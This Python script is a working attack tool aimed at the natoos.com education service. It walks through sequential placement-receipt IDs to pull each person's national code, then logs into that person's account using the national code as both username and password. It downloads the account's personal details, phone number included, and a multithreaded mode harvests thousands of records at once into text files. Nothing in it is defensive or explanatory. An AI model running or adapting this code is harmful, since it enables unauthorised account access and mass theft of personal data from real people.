import requests
import urllib.parse
import time
import os
import re
import sys
from concurrent.futures import ThreadPoolExecutor
import threading

def get_token():
    url = "https://reports.natoos.com/token/GetIframeToken"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.natoos.com",
        "referer": "https://www.natoos.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
    }
    try:
        res = requests.get(url, headers=headers, timeout=5)
        raw_token = res.json().get("token")
        return urllib.parse.quote(raw_token, safe='/.').replace('=', '%3d')
    except:
        return None

base_headers = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "origin": "https://www.natoos.com",
    "referer": "https://www.natoos.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
}

def clean_html(text):
    return ' '.join(re.sub(r'<[^>]+>', '', text).split())

def process_single_check(pid):
    token = get_token()
    if not token: return None, "token fail"
    
    try:
        url = f"https://reports.natoos.com/Education/GetPlacementReceipt?PlacementId={pid}&token={token}"
        res = requests.get(url, headers=base_headers, timeout=5)
        text = res.text
        
        if "An error occurred" in text or "<title>Error</title>" in text or 'width:172px' not in text:
            return None, "bad receipt"
        
        nc = "N/A"
        match = re.search(r'width:172px[^>]*>(.*?)</td>\s*<td', text, re.DOTALL)
        if match:
            nc = "".join(re.findall(r'\d+', clean_html(match.group(1)))) or "N/A"
            
        if nc == "N/A":
            alt_match = re.search(r'height:28px;width:172px[^>]*>(.*?)</td>', text, re.DOTALL)
            if alt_match:
                nc = "".join(re.findall(r'\d+', clean_html(alt_match.group(1)))) or "N/A"

        lvl = "N/A"
        l_match = re.search(r'width:153px[^>]*>(.*?)</td>', text, re.DOTALL)
        if l_match: lvl = clean_html(l_match.group(1)) or "N/A"

        reg = "N/A"
        r_match = re.search(r'width:153px[^>]*>(14\d\d/\d+/\d+)</td>', text, re.DOTALL)
        if r_match: reg = clean_html(r_match.group(1)) or "N/A"

        token_url = "https://services.natoos.com/api/Accounts/CreateToken"
        token_headers = {
            "User-Agent": base_headers["user-agent"],
            "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json"
        }
        
        t_res = requests.post(token_url, headers=token_headers, json={"NationalCode": nc, "Password": nc}, timeout=5)
        t_text = t_res.text
        
        if "ErrorData" in t_text or "token" not in t_text: return None, "CreateToken fail"
            
        jwt = re.search(r'"token":"([^"]+)"', t_text)
        jwt = jwt.group(1) if jwt else "N/A"

        user_url = "https://services.natoos.com/api/Accounts/GetUserInfo"
        u_headers = {"authorization": f"Bearer {jwt}", **token_headers}
        del u_headers["Content-Type"]
        
        user_data = None
        for _ in range(2):
            u_res = requests.get(user_url, headers=u_headers, timeout=5)
            if "CellPhoneNumber" in u_res.text:
                try:
                    user_data = u_res.json()
                    break
                except: pass
            time.sleep(0.1)
            
        if not user_data: return None, "GetUserInfo fail"

        lines = [f"Number of receipt : {pid}"]
        for k, v in user_data.items():
            lines.append(f"{k} : {'None' if v in (None, '') else v}")
                
        lines.extend([f"Level : {lvl}", f"Register_Date : {reg}"])
        return "\n".join(lines), None

    except Exception as e:
        return None, str(e)

print("="*40)
print("[1] Single (e.g. 3313561)")
print("[2] Range (e.g. 3000000 to 3010000)")
print("="*40)

mode = input("Choice (1/2): ").strip()

if mode == "1":
    pid = input("ID: ").strip()
    print("Checking...\n")
    res, err = process_single_check(pid)
    
    if err:
        print(f"Error: {err}")
    else:
        with open(f"{pid}.txt", "w", encoding="utf-8") as f:
            f.write(res)
        print(res)
        print(f"\nSaved to {pid}.txt")

elif mode == "2":
    start = int(input("Start ID: ").strip())
    end = int(input("End ID: ").strip())
    cps = int(input("Threads: ").strip())
    
    folder = f"{start}_to_{end}"
    os.makedirs(folder, exist_ok=True)
    main_f = os.path.join(folder, f"{folder}.txt")
    err_f = os.path.join(folder, "wrongs.txt")
    
    print(f"\nScanning {start}-{end} with {cps} threads...")
    
    stats = {"checked": 0, "ok": 0, "bad": 0}
    start_time = time.time()
    lock = threading.Lock()
    
    open(main_f, "w").close()
    open(err_f, "w").close()

    def worker(pid):
        res, err = process_single_check(str(pid))
        
        with lock:
            stats["checked"] += 1
            if err:
                stats["bad"] += 1
                with open(err_f, "a", encoding="utf-8") as f:
                    f.write(f"ID: {pid} | Err: {err}\n")
            else:
                stats["ok"] += 1
                with open(main_f, "a", encoding="utf-8") as f:
                    f.write(res + "\n\n\n")
            
            elapsed = time.time() - start_time
            speed = round(stats["checked"] / elapsed, 2) if elapsed > 0 else 0
            sys.stdout.write(f"\rChecked: {stats['checked']} | Speed: {speed} | OK: {stats['ok']} | Bad: {stats['bad']}   ")
            sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=cps if cps > 0 else 10) as ex:
        ex.map(worker, range(start, end + 1))
                
    print("\n\nDone.")